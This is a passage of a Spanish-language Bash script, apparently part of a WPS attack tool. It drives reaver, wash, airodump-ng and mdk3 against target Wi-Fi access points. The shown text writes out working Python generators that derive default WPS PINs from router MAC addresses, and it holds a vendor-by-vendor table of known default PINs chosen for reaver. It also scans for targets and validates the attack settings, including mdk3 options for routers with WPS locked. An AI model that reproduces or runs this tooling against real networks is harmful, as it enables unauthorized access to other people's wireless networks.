echo -e "$inp  Entraste$yel $USE_PIN1$info escribe$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"


	elif [ $USE_PIN1 == h ] || [ $USE_PIN1 == H ]; then

echo ""
echo -e "$inp  Entraste$yel $USE_PIN1$info para ayudar escribe $yel (n/N)$inp para volver a intentarlo.$txtrst"

         else

echo ""
echo -e "$warn Error escribe $yel (n/N)$inp para volver a intentarlo.$txtrst"

			fi

read USE_PIN1TEST


	case $USE_PIN1TEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"

	done
	clear
		done

	if [ $USE_PIN1 == y ] || [ $USE_PIN1 == Y ]; then

###Empezar De WPSPIN-1.3 predeterminado Pin Generador Empezar###
###Empezar de Crear WPSpin.py y easybox_wps.py  Empezar###

### WPSpin.py ###
echo '
import sys
 
VERSION    = 1
SUBVERSION = 0
 
def usage():
    print "[+] WPSpin %d.%d " % (VERSION, SUBVERSION)
    print "[*] Usage : python WPSpin.py 123456"
    sys.exit(0)
 
def wps_pin_checksum(pin):
    accum = 0
 
    while(pin):
        accum += 3 * (pin % 10)
        pin /= 10
        accum += pin % 10
        pin /= 10
    return  (10 - accum % 10) % 10
 
try:
    if (len(sys.argv[1]) == 6):
        p = int(sys.argv[1] , 16) % 10000000
        print "[+] WPS pin might be : %07d%d" % (p, wps_pin_checksum(p))
    else:
        usage()
except Exception:
    usage()
' > WPSpin.py

############## easybox_wps.py ##############

echo '#!/usr/bin/env python
import sys, re

def gen_pin (mac_str, sn):
    mac_int = [int(x, 16) for x in mac_str]
    sn_int = [0]*5+[int(x) for x in sn[5:]]
    hpin = [0] * 7
    
    k1 = (sn_int[6] + sn_int[7] + mac_int[10] + mac_int[11]) & 0xF
    k2 = (sn_int[8] + sn_int[9] + mac_int[8] + mac_int[9]) & 0xF
    hpin[0] = k1 ^ sn_int[9];
    hpin[1] = k1 ^ sn_int[8];
    hpin[2] = k2 ^ mac_int[9];
    hpin[3] = k2 ^ mac_int[10];
    hpin[4] = mac_int[10] ^ sn_int[9];
    hpin[5] = mac_int[11] ^ sn_int[8];
    hpin[6] = k1 ^ sn_int[7];
    pin = int("%1X%1X%1X%1X%1X%1X%1X" % (hpin[0], hpin[1], hpin[2], hpin[3], hpin[4], hpin[5], hpin[6]), 16) % 10000000

    # WPS PIN Suma de control - para más información see hostapd/wpa_supplicant source (wps_pin_checksum) o
	# http://download.microsoft.com/download/a/f/7/af7777e5-7dcd-4800-8a0a-b18336565f5b/WCN-Netspec.doc    
    accum = 0
    t = pin
    while (t):
        accum += 3 * (t % 10)
        t /= 10
        accum += t % 10
        t /= 10
    return "%i%i" % (pin, (10 - accum % 10) % 10)

def main():
    if len(sys.argv) != 2:
        sys.exit("usage: easybox_wps.py [BSSID]\n eg. easybox_wps.py 38:22:9D:11:22:33\n")
        
    mac_str = re.sub(r"[^a-fA-F0-9]", "", sys.argv[1])
    if len(mac_str) != 12:
        sys.exit("check MAC format!\n")
        
    sn = "R----%05i" % int(mac_str[8:12], 16)
    print "derived serial number:", sn
    print "SSID: Arcor|EasyBox|Vodafone-%c%c%c%c%c%c" % (mac_str[6], mac_str[7], mac_str[8], mac_str[9], sn[5], sn[9])        
    print "WPS pin:", gen_pin(mac_str, sn)

if __name__ == "__main__":
    main()
' > easybox_wps.py

###fin de Crear WPSpin.py y easybox_wps.py fin##############

###EMPEZAR  Por defecto Pin Generación EMPEZAR ##############

clear

PinMAC1=$(echo $MACALNUM | sed 's/://g' | cut -c 7-12)
PinMAC2=$(echo $MACALNUM | sed 's/://g' | cut -c 1-6)
WPSpin1=`python WPSpin.py $PinMAC1 | awk '{ print $7 }'`
WPSpin2=`python WPSpin.py $PinMAC2 | awk '{ print $7 }'`
easybox=`python easybox_wps.py $MACALNUM | grep "WPS pin" | cut -c 10-17`

##############fin De Pin Generación fin##############

############## Comienzo De Información Comentario ##############

clear
echo ""
#echo -e "$info Listado de posibles botones predeterminados WPS.$txtrst"
#echo ""
#echo -e "$info  seleccionado essid:$yel $NAME1"
#echo -e "$info  seleccionado bssid:$yel $TARGETAP1"
#echo -e "$info Has elegido channel:$yel $CHANNEL1"
#echo ""
#echo -e "$info  Posible WPS Pin1:$yel    $WPSpin1"
#echo -e "$info  Posible WPS Pin2:$yel    $WPSpin2"
#echo -e "$info  Posible easybox Pin:$yel $easybox"

############## Comienzo De WPSPIN-1.3 predeterminado Pin Generador ##############

ESSID=$(echo $NAME1)
BSSID=$(echo $MACALNUM)

FUNC_CHECKSUM(){
ACCUM=0

ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`

DIGIT=`expr $ACCUM '%' 10`
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`

PIN=`expr $PIN '+' $CHECKSUM`
ACCUM=0

ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1 ')' '%' 10 ')'`

RESTE=`expr $ACCUM '%' 10`
 }

CHECKBSSID=$(echo $BSSID | cut -d ":" -f1,2,3 | tr -d ':')

FINBSSID=$(echo $BSSID | cut -d ':' -f4-)

MAC=$(echo $FINBSSID | tr -d ':')

CONVERTEDMAC=$(printf '%d\n' 0x$MAC)

FINESSID=$(echo $ESSID | cut -d '-' -f2)

PAREMAC=$(echo $FINBSSID | cut -d ':' -f1 | tr -d ':')

CHECKMAC=$(echo $FINBSSID | cut -d ':' -f2- | tr -d ':')

MACESSID=$(echo $PAREMAC$FINESSID)

STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')'`

PIN=`expr 10 '*' $STRING`

FUNC_CHECKSUM

PINWPS1=$(printf '%08d\n' $PIN)

STRING2=`expr $STRING '+' 8`
PIN=`expr 10 '*' $STRING2`

FUNC_CHECKSUM

PINWPS2=$(printf '%08d\n' $PIN)

STRING3=`expr $STRING '+' 14`
PIN=`expr 10 '*' $STRING3`

FUNC_CHECKSUM

PINWPS3=$(printf '%08d\n' $PIN)

if [[ $ESSID =~ ^FTE-[[:xdigit:]]{4}[[:blank:]]*$ ]] &&  [[ "$CHECKBSSID" = "04C06F" || "$CHECKBSSID" = "202BC1" || "$CHECKBSSID" = "285FDB" || "$CHECKBSSID" = "80B686" || "$CHECKBSSID" = "84A8E4" || "$CHECKBSSID" = "B4749F" || "$CHECKBSSID" = "BC7670" || "$CHECKBSSID" = "CC96A0" ]] &&  [[ $(printf '%d\n' 0x$CHECKMAC) = `expr $(printf '%d\n' 0x$FINESSID) '+' 7` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 1` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 7` ]];

then

CONVERTEDMACESSID=$(printf '%d\n' 0x$MACESSID)

RAIZ=`expr '(' $CONVERTEDMACESSID '%' 10000000 ')'`

STRING4=`expr $RAIZ '+' 7`

PIN=`expr 10 '*' $STRING4`

FUNC_CHECKSUM

PINWPS4=$(printf '%08d\n' $PIN)

echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS4  "
PIN4REAVER=$PINWPS4
else
case $CHECKBSSID in
04C06F | 202BC1 | 285FDB | 80B686 | 84A8E4 | B4749F | BC7670 | CC96A0)
echo -e "$info"  Otros Posible Pin"$info:$yel $PINWPS1  
$info"  Otros Posible Pin"$info:$yel $PINWPS2  
$info"  Otros Posible Pin"$info:$yel $PINWPS3"
PIN4REAVER=$PINWPS1
;;
001915)
echo -e "$info"  Otros Posible Pin"$info:$yel 12345670"
PIN4REAVER=12345670
;;
404A03)
echo -e "$info"  Otros Posible Pin"$info:$yel 11866428"
PIN4REAVER=11866428
;;
F43E61 | 001FA4)
echo -e "$info"  Otros Posible Pin"$info:$yel 12345670"
PIN4REAVER=12345670
;;
001A2B)
if [[ $ESSID =~ ^WLAN_[[:xdigit:]]{4}[[:blank:]]*$ ]];
then
echo -e "$info"  Otros Posible Pin"$info:$yel 88478760"
PIN4REAVER=88478760
else
echo -e "PIN POSIBLE... > $PINWPS1"
PIN4REAVER=$PINWPS1
fi
;;
3872C0)
if [[ $ESSID =~ ^JAZZTEL_[[:xdigit:]]{4}[[:blank:]]*$ ]];
then
echo -e "$info"  Otros Posible Pin"$info:$yel 18836486"
PIN4REAVER=18836486
else
echo -e "PIN POSIBLE    > $PINWPS1"
PIN4REAVER=$PINWPS1
fi
;;
FCF528)
echo -e "$info"  Otros Posible Pin"$info:$yel 20329761"
PIN4REAVER=20329761
;;
3039F2)
echo -e "  varias posibles PINs, ranked en orden>  
 16538061 16702738 18355604 88202907 73767053 43297917"
PIN4REAVER=16538061
;;
A4526F)
echo -e "  varias posibles PINs, ranked en orden>  
 16538061 88202907 73767053 16702738 43297917 18355604 "
PIN4REAVER=16538061
;;
74888B)
echo -e "  varias posibles PINs, ranked en orden>  
 43297917 73767053 88202907 16538061 16702738 18355604"
PIN4REAVER=43297917
;;
DC0B1A)
echo -e "  varias posibles PINs, ranked en orden>  
 16538061 16702738 18355604 88202907 73767053 43297917"
PIN4REAVER=16538061
;;
5C4CA9 | 62A8E4 | 62C06F | 62C61F | 62E87B | 6A559C | 6AA8E4 | 6AC06F | 6AC714 | 6AD167 | 72A8E4 | 72C06F | 72C714 | 72E87B | 723DFF | 7253D4)
##echo -e "$info"  Otros Posible Pin"$info:$yel $PINWPS1 "
PIN4REAVER=$PINWPS1
;;
002275)
##echo -e "$info"  Otros Posible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
08863B)
##echo -e "$info"  Otros Posible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
001CDF)
##echo -e "$info"  Otros Posible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
00A026)
##echo -e "$info"  Otros Posible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
5057F0)
##echo -e "$info"  Otros Posible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
C83A35 | 00B00C | 081075)
##echo -e "$info"  Otros Posible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
E47CF9 | 801F02)
##echo -e "$info"  Otros Posible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
0022F7)
##echo -e "$info"  Otros Posible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
*)
##echo -e $info"  Otros Posible Pin$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
echo -e "$txtrst"
;;
esac

fi

##############fin WPSPIN-1.3 predeterminado Pin Gen fin##############

until  [ $WPS_COMTEST == y ] || [ $WPS_COMTEST == Y ]; do  

echo ""
echo -e  "$q    Desea generar una lista PIN predeterminado WPS para la selección"
echo -e  "  o introducir un PIN WPS conocido manualmente?"
echo  ""
echo -e "$inp    Para generar una lista WPS PIN predeterminado entrar$yel (s/S)$info."
echo -e "$inp  Para introducir un PIN WPS conocido introducir manualmente$yel (m/M)$info.$txtrst"                  
read WPS_COM

	while true
	do

echo ""
echo -e "$inp  Entraste$yel $WPS_COM$inp escribe$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"
read WPS_COMTEST

	case $WPS_COMTEST in
	y|Y|n|N) break ;;
	~|~~)
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"

	done

		done

if [ $WPS_COM == s ] || [ $WPS_COM == S ]; then

until  [ $PIN_SELECTEST == y ] || [ $PIN_SELECTEST == Y ]; do

echo -e "$inp Seleccione el número de línea de la WPS defecto Pin desea probar.$txtrst"

echo "          BSSID = $MACALNUM"
echo -e "     $info 1) Posible WPS Pin1:$yel    $WPSpin1"
echo -e "     $info 2) Posible WPS Pin2:$yel    $WPSpin2"
echo -e "     $info 3) Posible easybox Pin:$yel $easybox"
echo -e "     $info 4) Otros Posible Pin:$yel   $PINWPS1$txtrst"
    
	read PIN_SELECT
	
        case $PIN_SELECT in

	1) WPS_PIN1=$WPSpin1;;
        2) WPS_PIN1=$WPSpin2;;
	3) WPS_PIN1=$easybox;;
	4) WPS_PIN1=$PINWPS1;;
        *) invalid options;;

	esac

	while true
	do

echo ""
echo -e "$inp  Entraste$yel $WPS_PIN1$inp escribe$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"
read PIN_SELECTEST

	case $PIN_SELECTEST in
	y|Y|n|N) break ;;
	~|~~)
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"

	done

		done

		fi #[ $WPS_COM == s ]


			fi  # if [ $USE_PIN1 == y ]

if [ $WPS_COM == m ] || [ $WPS_COM == M ]; then

until  [ $PIN_MANTEST == y ] || [ $PIN_MANTEST == Y ]; do

echo -e "$inp Introduzca los ocho(8) dígitos PIN WPS que desea probar.$txtrst"

read WPS_PIN1

	WPS_SIZE1=${#WPS_PIN1}

	if [[ $WPS_SIZE1 == 8 ]]; then

	: # Do Nothing

	else

	echo "$warn  WPS_PIN1=$WPS_PIN1 MUST ocho(8) números de longitud."

         fi

	case $WPS_PIN1 in

	''|*[!0-9]*) echo WPS_PIN1=$WPS_PIN1 Error Tiene que ser un número. ;;
  	*) echo :  ;;

	esac

	while true
	do

echo ""
echo -e "$inp  Entraste$yel $WPS_PIN1$inp escribe$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"
read PIN_MANTEST

	case $PIN_MANTEST in
	y|Y|n|N) break ;;
	~|~~)
	exit
	echo Aborting - 
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"

	done

		done

			fi

}

#~~~~~~~~~~~~~~~fin WPS_DEFAULT fin~~~~~~~~~~~~~~~#

SELECT_DEVICE_fn

BOOST_DEVICE_fn

SELECT_MONITOR_fn

# Haga directorio para exploraciones de lavado temporales

if [ ! -d "VARMAC_WASH" ]; then

    mkdir -p -m 700 VARMAC_WASH;

	fi

# Borre los archivos en la carpeta temporal

rm -rfv VARMAC_WASH/* &> /dev/null


######hacer que el directorio para la salida reaver #############

if [[ ! -d "VARMAC_LOGS" ]]; then

    mkdir -p -m 700 VARMAC_LOGS;

	fi

##################fin hacer dir######################

######hacer que el directorio para la salida reaver y advertir #############

clear

if [[ ! -d "/root/VARMAC_CONFIG" ]]; then

	mkdir -p -m 700 VARMAC_CONFIG;

        fi

############Compruebe si VARMAC_CONFIG está vacía###########

############ aleta Compruebe si VARMAC_CONFIG está vacía###########

CONFIG_WRITE

#### Interruptor para Monitor Avanzada

OVERRIDE_MDK3=n

#########WASH TARGET SCAN##############

echo -e  "$info    Ejecución de lavado objetivo del análisis para la selección de objetivos."

Eterm -g 100x30-1+1 --cmod "red" --no-cursor  -T "Wash AP Selection " -e sh -c "wash -i $MON 2>&1 | tee VARMAC_WASH/wash01.txt" &

sleep 1

Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "Airodump-ng AP Selection " -e sh -c "airodump-ng $MON" &

###########Entrada manual HIDDEN SSID Manipulación##########

clear
until  [ $AP_HIDDENTEST == y ] || [ $AP_HIDDENTEST == Y ]; do 

echo ""
echo -e "$q                         PARA ENTRADA AUTOMÁTICA"
echo "" 
echo -e "$inp    Cuando la exploración es completa y targetAP ha visto entrar$yel (y/Y)$inp continuar...$txtrst"      
echo -e "$info   Programa mostrará una lista y cargar los datos de destino seleccionados automáticamente."

echo  ""
echo -e "$q                          Para la entrada manual"
echo -e "$info                          (Casos especiales)"
echo ""
echo -e "$info    Si targetAP tiene un oculto ESSID( sin nombre APP visto) o,"
echo -e "$info  Objetivo que no se encuentra puede introducir información manualmente."
echo -e "$inp  Ingrese$yel (m/M)$inp para entrar en el nombre de la aplicación, la dirección MAC y el canal manualmente.$txtrst"
echo ""
echo -e "$yel   [y/Y]$inp Para seleccionar diana de una lista de exploración de lavado de APs visto entrar:$yel [y/Y]"
echo "" 
echo -e "$yel   [m/M]$inp Para introducir los datos manualmente targetAP (casos especiales) seleccionar:$yel [m/M]$txtrst"
echo ""
echo "     Ingrese y/Y o m/M"

read AP_HIDDEN

	while true
	do

echo ""
echo -e "$info    Has elegido$yel $AP_HIDDEN$info."
echo ""
echo -e "$inp Ingrese$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"
read AP_HIDDENTEST

	case $AP_HIDDENTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"

	done

		done

###Selección manual APP Nombre, mac, canal###

if [ $AP_HIDDEN == m ] || [ $AP_HIDDEN == M ]; then

	echo ""
	echo -e "$inp    Introduzca el nombre oculto de la targetAP."
	echo -e "$info  Nombres de AP con espacios no requieren paréntesis(Wifi).$txtrst"
	read NAME1
	echo ""
	echo -e "$inp    Introduzca la dirección MAC de la targetAP.$txtrst"
        echo -e "$inp  Introduzca en este formato$yel 55:44:33:22:11:00$inp SOLAMENTE!!!"
        echo ""
        echo -e "$info Existe cierta gestión de errores de esta entrada.$txtrst"
	read TARGETAP1

	MACERROR_HANDEL_fn

	echo ""
	echo -e "$inp    Ingrese el$yel canal$inp de El targetAP."
	echo -e "$info  Ingrese$yel zero(0)$info si usted desea reaver canalizar hop$txtrst"
	echo -e "$info  la búsqueda de la AP.$txtrst"
	read CHANNEL_MAN
		

	MANUAL_SELECT_fn

	fi  #if [[ $AP_HIDDEN == m


#Write
#if [ $AP_HIDDEN == m ] || [ $AP_HIDDEN == M ]; then

#Necesitas Variable ARCHIVO SSID


#		fi


###Entrada manual HIDDEN SSID Manipulación###

#### Déjate caer visto la entrada de datos del menú Target AP ####

if [ $AP_HIDDEN == y ] || [ $AP_HIDDEN == Y ]; then

cat < VARMAC_WASH/wash01.txt | awk -F' ' '{ if(($5 == "No") || ($5 == "Yes")) {print $1 " " $2 " " substr($0, index($0,$6))}}' > VARMAC_WASH/wash02.txt

cat < VARMAC_WASH/wash02.txt | awk -F' ' '{print $1}' > VARMAC_WASH/MAC_LIST.txt

cat < VARMAC_WASH/wash02.txt | awk -F' ' '{print $2}' > VARMAC_WASH/CHANNEL_LIST.txt

cat < VARMAC_WASH/wash02.txt | awk -F' ' '{print $3" "$4" "$5" "$6" "$7}' > VARMAC_WASH/APNAME_LIST.txt

sleep 2

until  [ $WASHNAMETEST == y ] || [ $WASHNAMETEST == Y ]; do  

echo -e "$txtrst "

# Hacer la lista de archivos en la carpeta como variables
WASHNAME=$(cat VARMAC_WASH/APNAME_LIST.txt | nl -ba -w 1  -s ': ')
clear
echo ""
echo -e "$info TargetAPs encontrado por wash.$txtrst"
echo " "
echo "$WASHNAME" | sed 's/^/       /'
echo ""
echo -e "$yel      !!!$info Un archivo de configuración específica será escrito para cada target$yel !!!"
echo ""
echo -e "$info     Cuando se selecciona el destino, el guión escribirá una configuración"
echo -e "$info  presentar a la$yel /root/VARMAC_CONFIG/$info carpeta. El nombre del archivo será"
echo -e "$info  el nombre AP$yel(ESSID)$info seguido de la dirección mac$yel(BSSID)$info. Si existe el archivo,"
echo -e "$info  El archivo$yel NO$info sobrescribir."
echo -e "$info     El uso de archivos individuales para cada objetivo de evitar conflictos con reaver"
echo -e "$info  y ayudar a mantener los parámetros de ataque constante. Por ejemplo, el uso y"
echo -e "$info  cuando no se utiliza $yel --dh-small/-S$info causará reaver para restablecer el pin"
echo -e "$info  contar. Todo el ataque se reiniciará y todo el trabajo anterior será"
echo -e "$info  perdido.$txtrst"
echo ""

echo ""
read  -p "   Ingrese número de línea de seleccionados TargetAP Aquí: " grep_Line_Number

echo -e "$txtrst"
NAME1=$(cat VARMAC_WASH/APNAME_LIST.txt | sed -n ""$grep_Line_Number"p")

# Eliminar espacios finales blancos deja espacios entre nombres intactos

NAME1=$(echo $NAME1 | xargs)

TARGETAP1=$(cat VARMAC_WASH/MAC_LIST.txt | sed -n ""$grep_Line_Number"p")

# ADN basura comando de mantener para su uso posterior, pero rem cabo
# CHANNEL_INFO=$(cat VARMAC_WASH/CHANNEL_LIST.txt | sed -n ""$grep_Line_Number"p")
echo ""

	while true
	do

echo ""
echo ""
echo -e "$info    Has elegido:"
echo ""
echo -e "$info      1. $yel $NAME1$info como la targetAPs' nombre."
echo ""
echo -e "$info      2. $yel $TARGETAP1$info como la targetAPs' dirección MAC."
echo ""
echo -e "$inp Ingrese$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"
read WASHNAMETEST

	case $WASHNAMETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"
	rm configlist.txt

	done
		done

			fi #if [[ $AP_HIDDEN == y

####FIN Desplegar el menú de entrada de datos FIN####

sleep 2
killall -q wash
killall -q airodump-ng
sleep 1
killall -q Eterm

MACALNUM=`echo "$TARGETAP1" | tr -d -c ".[:alnum:]"`

####Escribir archivo de configuración de carpeta con el nombre SSID y MAC agregar como nombre de archivo

#Nombres Handel SSID w / espacios dan nombre de variable
# Eliminar espacios finales blancos deja espacios entre nombres intactos

########### Quite los espacios de nombres para los nombres de archivos #########

CON_FILENAME1=$(echo $NAME1 | xargs)

########### Quite los espacios de nombres para los nombres de archivos #########

CON_FILENAME1=${CON_FILENAME1// /_}

CONFIG_WRITE

### variable para exploración de salida reaver ### 

EAPOL="[+] Enviando EAPOL START petición
[+] Solicitud de la identidad recibida
[+] Envío de respuesta de identidad"

###Fin variable para exploración de salida reaver Fin###

##########nombres de los archivos fuente y existencia###############

until  [ $SOURCENAMETEST == y ] || [ $SOURCENAMETEST == Y ]; do  

echo -e "$txtrst "
ls /root/VARMAC_CONFIG | tee configlist.txt &> /dev/null
clear

# Hacer la lista de archivos en la carpeta de una variable
configfiles=$(cat configlist.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Configuration files listed in the$yel VARMAC_CONFIG$info folder.$txtrst"
echo " "
echo "$configfiles" | sed 's/^/       /'
echo ""
echo -e "$inp     Selecciona el$yel archivo de configuración$inp para ser usado.$txtrst"
echo -e "$info  Un archivo de configuración$yel $CON_FILENAME1-$MACALNUM$info se ha hecho para el uso"
echo -e "$info  con este objetivo de comprar cualquier archivo de configuración que aparece se puede utilizar."
echo -e "$info  Después de la selección aparecerán los parámetros del archivo de configuración. Puede revisar"
echo -e "$info  configuración y realizar cambios que se escriben en el archivo elegido."
echo ""
echo -e "     Una vez que el programa se está ejecutando, abra el archivo de configuración con$yel leafpad$info,"
echo -e "  realizar los cambios y guardar. El archivo de configuración se carga en el inicio de"
echo -e "  Stages II, III & IV.$txtrst"
echo ""
read  -p "   Ingrese número de línea del archivo de configuración Aquí: " grep_Line_Number

echo -e "$txtrst"
SOURCENAME=$(cat configlist.txt | sed -n ""$grep_Line_Number"p")
echo ""

	while true
	do

#leafpad /root/VARMAC_CONFIG/$SOURCENAME &
echo ""
echo -e "$info    Has elegido$yel $SOURCENAME$info como archivo de configuración." 
echo -e "$inp Ingrese$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"
read SOURCENAMETEST

	case $SOURCENAMETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"
	rm -f configlist.txt
	done

		done

rm -f configlist.txt


### Archivo de configuración de carga ###

until  [ $SOURCEGOODTEST == y ] || [ $SOURCEGOODTEST == Y ]; do

#source /root/VARMAC_CONFIG/$SOURCENAME

CONFIG_ADJUST_fn
sleep 2
#recargar después de los cambios de empujar a través de rutinas de error
chmod 755 /root/VARMAC_CONFIG/$SOURCENAME

#/root/VARMAC_CONFIG/$SOURCENAME

while true

do

###Empezar config manejo de errores archivo Empezar###

#Error Handeling CHANNEL1=0

if [[ $CHANNEL1 -gt 0 && $CHANNEL1 -le 14 ]]; then
        echo -e "$txtrst"
	echo "  ERROR CHANNEL1=$CHANNEL1"
	echo "    Para las operaciones en contra de las CM Bloqueado Routers"
        echo "  establecer canales a cero(0) Sólo."
        echo "    Para las operaciones en contra de los routers donde el sistema WPS"
	echo "  no está bloqueado - el establecimiento de un canal específico es opcional."
	echo ""
		fi

if [[ $CHANNEL1 -ge 0 && $CHANNEL1 -le 14 ]]; then

	: # Hacer nada

	else

	echo "  ERROR CHANNEL1=$CHANNEL1 Deberá ser fijado de 0 a 14 Sólo"

		fi

# Error Handeling USE_R1=y

if [[ $USE_R1 == n  || $USE_R1 == N || $USE_R1 == y || $USE_R1 == Y ]]; then

         : # Hacer nada	
else      
	echo "  ERROR USE_R1=$USE_R1 Debe establecerse en n o N o y o Y Sólo!"

		fi

# Error Handeling RX1=y

if [[ $USE_R1 == y || $USE_R1 == Y ]]; then

    if [[ $RX1 > 0 ]]; then

	: # Hacer nada

	else

	echo "  ERROR RX1=$RX1 MUST un número mayor que 0."

	fi
		fi	

# Error Handeling RY1=y

if [[ $USE_R1 == y || $USE_R1 == Y ]]; then

    if [[ $RY1 > 0 ]]; then

	: # Hacer nada

	else

	echo "  ERROR RY1=$RY1 Debe ser un número mayor que 0."

	fi
		fi	

# Error Handeling LIVE1

case $LIVE1 in

''|*[!0-9]*) echo ERROR LIVE1=$LIVE1 Debe ser un número mayor que 0. ;;
#  *) echo :  ;;

	esac

# Error Handeling USE_LONG1

if [[ $USE_LONG1 == n || $USE_LONG1 == N || $USE_LONG1 == y || $USE_LONG1 == Y ]]; then

        : # Hacer nada
else
	echo "  ERROR USE_LONG1=$USE_LONG1 Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

# Error Handeling = MDKTYPE1=3

if [[ $MDKTYPE1 -gt 15 ]]; then

	echo "  ERROR MDKTYPE1=$MDKTYPE1 Debe ser un número del 1 al 15."

    fi

case $MDKTYPE1 in

	''|*[!0-9]*) echo ERROR MDKTYPE1=$MDKTYPE1 Debe ser un número del 1 al 15. ;;
	#  *) echo :  ;;

	esac

# Error handeling MDKLIVE=

case $MDKLIVE in

	''|*[!0-9]*) echo ERROR MDKLIVE=$MDKLIVE  Tiene que ser un número. ;;
	#  *) echo :  ;;

	esac

# Error handeling PAUSE=

case $PAUSE in

	''|*[!0-9]*) echo ERROR PAUSE=$PAUSE Tiene que ser un número. ;;
	#  *) echo :  ;;

	esac

# Error Handeling REAVER_COUNT=

if [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] || [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]]; then

	: # Hacer nada

else
	echo "  ERROR REAVER_COUNT=$REAVER_COUNT Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

if [[ $MDK3_COUNT == n || $MDK3_COUNT == N || $MDK3_COUNT == y || $MDK3_COUNT == Y ]]; then

	: # Hacer nada

else

	echo "  ERROR MDK3_COUNT=$MDK3_COUNT Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

#Error Handeling WASH_COUNT=

if [[ $WASH_COUNT == n || $WASH_COUNT == N ]] || [[ $WASH_COUNT == y || $WASH_COUNT == Y ]]; then

	: # Hacer nada

else

	echo "  ERROR WASH_COUNT=$WASH_COUNT Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

#Error Handeling=ADVANMON=

if [[ $ADVANMON == n || $ADVANMON == N || $ADVANMON == y || $ADVANMON == Y ]]; then

	: # Hacer nada

else

	echo "  ERROR ADVANMON=$ADVANMON Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

#Error Handeling=ADVAN_TIME=

if [[ $ADVANMON == y || $ADVANMON == Y ]]; then

case $ADVAN_TIME in

''|*[!0-9]*) echo ERROR ADVAN_TIME=$ADVAN_TIME Tiene que ser un número. ;;
#  *) echo :  ;;

	esac

		fi

#Error Handeling=DAMP_MDK=

if [[ $DAMP_MDK == n || $DAMP_MDK == N || $DAMP_MDK == y || $DAMP_MDK == Y ]]; then

	: # Hacer nada

else

	echo "  ERROR DAMP_MDK=$DAMP_MDK Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

